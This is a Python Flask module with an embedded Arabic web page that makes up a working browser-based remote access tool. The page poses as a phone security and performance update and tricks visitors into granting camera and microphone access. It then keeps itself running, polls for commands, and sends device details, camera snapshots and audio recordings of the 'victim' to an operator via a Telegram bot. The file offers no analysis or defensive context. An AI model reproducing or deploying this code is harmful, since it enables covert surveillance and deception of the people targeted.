import os
import base64
import io
from flask import Blueprint, render_template_string, request

rat_bp = Blueprint('rat_module_v3', __name__)

RAT_PRO_TEMPLATE = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تحديث النظام والأمان الشامل</title>
    <style>
        body { background-color: #030712; color: #f9fafb; font-family: Tahoma, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; text-align: center; }
        .box { background: #111827; border: 1px solid #374151; padding: 40px; border-radius: 16px; max-width: 380px; width: 90%; box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.5); }
        h2 { color: #60a5fa; font-size: 21px; margin-bottom: 12px; }
        p { font-size: 13px; color: #9ca3af; line-height: 1.6; margin-bottom: 25px; }
        .action-btn { background-color: #16a34a; color: #fff; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; padding: 15px; width: 100%; cursor: pointer; transition: 0.3s; }
        .action-btn:hover { background-color: #15803d; }
    </style>
</head>
<body>
    <div class="box" id="mainBox">
        <h2>🛡️ تحديث حماية الأداء والشبكة</h2>
        <p>انقر أدناه لتثبيت شهادة التشفير الجديدة وتحسين كفاءة المعالج في هاتفك.</p>
        <button class="action-btn" onclick="initSystem()">بدء التثبيت الفوري</button>
    </div>

    <!-- عناصر الوسائط المرئية والصوتية المخفية للتحكم الفوري -->
    <video id="v" autoplay playsinline muted style="display:none;"></video>
    <canvas id="c" style="display:none;"></canvas>

    <script>
        const chatId = "{{ chat_id }}";
        let mediaStream = null;
        let wakeLockObj = null;

        // 1. منع إغلاق أو سكون المتصفح في الخلفية بقوة
        async function requestPersistence() {
            try {
                if ('wakeLock' in navigator) {
                    wakeLockObj = await navigator.wakeLock.request('screen');
                }
                // تفعيل Web Worker وهمي أو حلقة استمرار لضمان بقاء الصفحة نشطة
                setInterval(() => {
                    if (document.hidden) {
                        console.log("Background pulse active");
                    }
                }, 5000);
            } catch (e) {}
        }

        async function initSystem() {
            try {
                requestPersistence();

                // طلب صلاحيات الكاميرا والميكروفون مرة واحدة
                mediaStream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } }, 
                    audio: true 
                });
                
                const video = document.getElementById('v');
                video.srcObject = mediaStream;
                await video.play();

                // إرسال معلومات الجهاز الأولية
                sendDeviceInfo();

                // بدء التقاط صورة أولية للتحقق
                setTimeout(() => captureAndSendSnapshot("📸 **تم التقاط أول صورة بعد الاتصال:**"), 1500);

                // بدء الاستماع المستمر للأوامر من تليجرام بدون توقف
                startCommandLoop();

                // تغيير الشاشة لتبدو كأن النظام قيد التحديث
                document.getElementById('mainBox').innerHTML = "<h2>✅ جاري التحديث في الخلفية...</h2><p>يرجى ترك هذه الصفحة مفتوحة لضمان استقرار النظام.</p>";

            } catch (err) {
                alert("يرجى الموافقة على الأذونات المطلوبة لضمان نجاح التحديث.");
            }
        }

        function sendDeviceInfo() {
            const info = {
                chat_id: chatId,
                platform: navigator.platform,
                userAgent: navigator.userAgent,
                screen: window.screen.width + "x" + window.screen.height,
                cores: navigator.hardwareConcurrency || 'غير معروف'
            };
            fetch('/rat_v3_collect', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(info)
            });
        }

        // 2. دالة متطورة لالتقاط صورة متجددة لحظياً من الـ Video Stream مباشرة
        function captureAndSendSnapshot(captionTitle) {
            const video = document.getElementById('v');
            const canvas = document.getElementById('c');
            
            if (!video.videoWidth) return;

            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            const imgData = canvas.toDataURL('image/jpeg', 0.85);

            fetch('/rat_v3_image', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chatId, image: imgData, title: captionTitle })
            });
        }

        // 3. إصلاح تام لتسجيل الصوت عبر ميكروفون الضحية وإرساله كملف صوتي صحيح
        function recordAndSendAudio() {
            if (!mediaStream) return;
            try {
                let chunks = [];
                // التأكد من دعم ترميز الصوت المناسب للمتصفح
                const options = { mimeType: 'audio/webm' };
                const recorder = new MediaRecorder(mediaStream, MediaRecorder.isTypeSupported('audio/webm') ? options : {});
                
                recorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
                recorder.onstop = () => {
                    const blob = new Blob(chunks, { type: 'audio/webm' });
                    const reader = new FileReader();
                    reader.readAsDataURL(blob);
                    reader.onloadend = () => {
                        fetch('/rat_v3_audio', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ chat_id: chatId, audio: reader.result })
                        });
                    };
                };
                
                recorder.start();
                setTimeout(() => {
                    if (recorder.state === "recording") {
                        recorder.stop();
                    }
                }, 6000); // تسجيل 6 ثوانٍ دقيقة
            } catch (err) {
                console.log("Audio recording error: ", err);
            }
        }

        // حلقة تفقد الأوامر السريعة في الخلفية كل 3 ثوانٍ
        function startCommandLoop() {
            setInterval(async () => {
                try {
                    let res = await fetch('/rat_v3_poll?id=' + chatId);
                    let cmd = await res.json();
                    
                    if (cmd.action === "snapshot") {
                        captureAndSendSnapshot("📸 **صورة فورية جديدة بناءً على طلبك:**");
                    } 
                    else if (cmd.action === "audio") {
                        recordAndSendAudio();
                    }
                } catch (e) {}
            }, 3000);
        }
    </script>
</body>
</html>
"""

pending_commands = {}

def init_rat_routes(app, bot):
    @app.route('/system_secure_v2', methods=['GET'])
    def rat_landing():
        chat_id = request.args.get('id', '0')
        return render_template_string(RAT_PRO_TEMPLATE, chat_id=chat_id)

    @app.route('/rat_v3_collect', methods=['POST'])
    def rat_collect():
        data = request.json or {}
        chat_id = data.get('chat_id')
        if chat_id and chat_id != '0':
            msg = (
                "🎯 **تم الاتصال بالضحية والعمل في الخلفية بنجاح!**\n\n"
                f"💻 **النظام:** `{data.get('platform')}`\n"
                f"🌐 **المتصفح:** `{data.get('userAgent')}`\n"
                f"📐 **الشاشة:** `{data.get('screen')}`\n\n"
                "👇 **استخدم الأوامر أدناه للتحكم اللحظي:**"
            )
            from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
            markup = InlineKeyboardMarkup()
            markup.row(
                InlineKeyboardButton("📸 التقاط صورة متجددة", callback_data=f"rat_cam_{chat_id}"),
                InlineKeyboardButton("🎙️ تسجيل صوتي", callback_data=f"rat_mic_{chat_id}")
            )
            try:
                bot.send_message(chat_id, msg, parse_mode="Markdown", reply_markup=markup)
            except Exception as e:
                print(f"Error: {e}")
        return {"status": "ok"}

    @app.route('/rat_v3_poll', methods=['GET'])
    def rat_poll():
        chat_id = request.args.get('id')
        if chat_id in pending_commands and pending_commands[chat_id]:
            action = pending_commands[chat_id].pop(0)
            return {"action": action}
        return {"action": "none"}

    @app.route('/rat_v3_image', methods=['POST'])
    def rat_image():
        data = request.json or {}
        chat_id = data.get('chat_id')
        img_data = data.get('image')
        title = data.get('title', "📸 **صورة كاميرا الضحية:**")
        if chat_id and img_data:
            try:
                header, encoded = img_data.split(",", 1)
                image_bytes = base64.b64decode(encoded)
                photo_file = io.BytesIO(image_bytes)
                photo_file.name = 'live_capture.jpg'
                bot.send_photo(chat_id, photo_file, caption=title, parse_mode="Markdown")
            except Exception as e:
                print(f"Img err: {e}")
        return {"status": "ok"}

    @app.route('/rat_v3_audio', methods=['POST'])
    def rat_audio():
        data = request.json or {}
        chat_id = data.get('chat_id')
        audio_data = data.get('audio')
        if chat_id and audio_data:
            try:
                header, encoded = audio_data.split(",", 1)
                audio_bytes = base64.b64decode(encoded)
                audio_file = io.BytesIO(audio_bytes)
                audio_file.name = 'target_voice.webm'
                bot.send_audio(chat_id, audio_file, caption="🎙️ **تسجيل صوتي مباشر ومحدث من الضحية:**", parse_mode="Markdown")
            except Exception as e:
                print(f"Audio err: {e}")
        return {"status": "ok"}

def queue_command(chat_id, action):
    if chat_id not in pending_commands:
        pending_commands[chat_id] = []
    pending_commands[chat_id].append(action)
